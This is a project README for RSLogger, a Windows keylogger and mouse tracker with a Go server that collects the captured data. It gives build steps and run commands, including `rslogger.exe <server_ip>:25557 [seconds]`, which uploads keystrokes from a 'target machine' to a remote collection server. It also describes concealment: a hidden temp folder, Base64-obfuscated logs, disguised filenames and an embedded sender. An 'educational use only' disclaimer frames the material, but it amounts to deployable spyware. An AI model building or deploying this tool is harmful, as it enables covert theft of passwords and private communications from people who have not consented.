# RSLogger

> **⚠️ FOR EDUCATIONAL USE ONLY**  
> This is for learning and security research. Don't use this on systems you don't own. Seriously - unauthorized monitoring is illegal. Use responsibly.

Keyboard and mouse logger written in Rust, with Go for network transfers over TLS.

## What it does

- **Keyboard Logging**: Captures all keystrokes with proper case sensitivity
- **Mouse Tracking**: Records mouse movements, clicks, and scroll events
- **Automatic Upload**: Periodically sends logs to a remote server via TLS
- **Single Binary**: Embedded Go sender for seamless operation
- **Thread-Safe**: Mutex-protected file writes
- **Features**: 
  - Hidden temp directory storage (`%TEMP%\.rsdata\`)
  - Base64 encoded log files (unreadable in Notepad)
  - Non-obvious filenames (`kb.dat`, `ms.dat`)

## Project Structure

```
rslogger/
├── client/                # Client (logger) component
│   ├── src/
│   │   ├── main.rs       # Entry point
│   │   ├── logger.rs     # Keyboard/mouse hooks
│   │   ├── uploader.rs   # File upload wrapper
│   │   └── sender.go     # Go file sender (embedded)
│   ├── .cargo/
│   │   └── config.toml   # Static linking config
│   └── Cargo.toml        # Rust dependencies
├── server/                # Server (receiver) component
│   ├── server.go         # Go TLS receiver
│   └── go.mod            # Go module
├── build.ps1             # Windows build script
└── README.md
```

## Components

### Client (`client/target/release/rslogger.exe`)
- Logs keyboard and mouse activity
- Embeds Go-compiled sender for TLS transmission
- Saves logs in hidden temp directory: `%TEMP%\.rsdata\kb.dat` and `%TEMP%\.rsdata\ms.dat`
- Logs are Base64 encoded for obfuscation
- Automatically uploads to server at configurable intervals

### Server (`server/server.exe`)
- TLS listener on port 25557
- Receives and decodes Base64 files
- Organizes files by sender IP: `data/<sender_ip>/`
- Saves as readable text: `keyboard.txt` and `mouse.txt`
- Self-signed certificate generation
- Written in Go for high-performance networking

## Building

**Requirements:**
- Rust
- Go 1.20+
- Windows (needs Windows API)

### Build Steps

**Important:** You must build the Go sender executable first before building the Rust client!

**Step 1: Build the Go sender**
```powershell
cd client\src
go build -tags sender -ldflags="-s -w" -o sender.exe sender.go
cd ..\..
```

**Step 2: Build the Rust client**
```powershell
cd client
cargo build --release
cd ..
```

**Step 3: Build the Go server**
```powershell
cd server
go build -tags server -ldflags="-s -w" -o server.exe server.go
cd ..
```

**Easy way (PowerShell script):**
```powershell
.\build.ps1
```

**With Make:**
```bash
make all      # Build everything
make client   # Build logger only
make server   # Build server only
make clean    # Clean build artifacts
```

## Usage

### Start Server (on remote machine)
```powershell
cd server
.\server.exe
```
Server runs on port 25557 and saves decoded files to `data/<sender_ip>/` folders with readable filenames (`keyboard.txt`, `mouse.txt`).

### Run Logger

**Local only (no upload):**
```powershell
cd client\target\release
.\rslogger.exe
```

**With upload:**
```powershell
cd client\target\release
.\rslogger.exe <server_ip>:25557 [seconds]
```

Example - upload every 5 minutes:
```powershell
.\rslogger.exe 192.168.1.100:25557 300
```

**Run as Administrator** or hooks won't work.

## Configuration

### Change Upload Interval
Pass interval in seconds as the second argument:
```powershell
.\rslogger.exe localhost:25557 60  # Upload every minute
```

### Change Port
Edit `src/server.go`:
```go
listener, err := tls.Listen("tcp", ":8443", config)
```

## How it works

**Client side (Rust):**
- Uses Windows hooks (`SetWindowsHookExW`) for keyboard and mouse
- Stores logs in hidden temp directory: `%TEMP%\.rsdata\`
- Encodes logs with Base64 to prevent easy reading
- Files named `kb.dat` and `ms.dat` (non-obvious names)
- Embeds Go sender binary at compile time
- Extracts sender to temp and runs it for uploads
- Periodically sends encoded logs to server

**Server side (Go):**
- TLS with self-signed certs (auto-generated)
- Receives files and identifies sender by IP address
- Creates folder per sender: `data/<ip>/`
- Decodes Base64 back to plain text
- Saves as `keyboard.txt` and `mouse.txt`
- Handles multiple connections concurrently

## File Storage

**Client (target machine):**
- Location: `%TEMP%\.rsdata\` (hidden folder)
- Files: `kb.dat`, `ms.dat`
- Format: Base64 encoded (unreadable in Notepad)

**Server (collection machine):**
- Location: `data/<sender_ip>/`
- Files: `keyboard.txt`, `mouse.txt`
- Format: Plain text (decoded)

Example structure:
```
data/
├── 192.168.1.100/
│   ├── keyboard.txt
│   └── mouse.txt
├── 192.168.1.101/
│   ├── keyboard.txt
│   └── mouse.txt
```

## Common Issues

**Won't start:**
- Run as admin (required for Windows hooks)
- Antivirus might block it

**Upload fails:**
- Check server is running
- Firewall on port 25557?
- Verify server address is correct

**Build fails:**
- Did you build `sender.exe` first? (Step 1 above)
- Go in PATH?
- GCC installed? (`pacman -S mingw-w64-x86_64-gcc`)
- Try `go mod tidy` in server/

**Can't find log files:**
- They're hidden! Go to `%TEMP%\.rsdata\`
- Files are named `kb.dat` and `ms.dat`
- They're Base64 encoded (won't be readable in Notepad)
- Check server `data/<ip>/` folders for decoded logs

## License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

## Disclaimer

For educational use only. Don't be stupid with this.
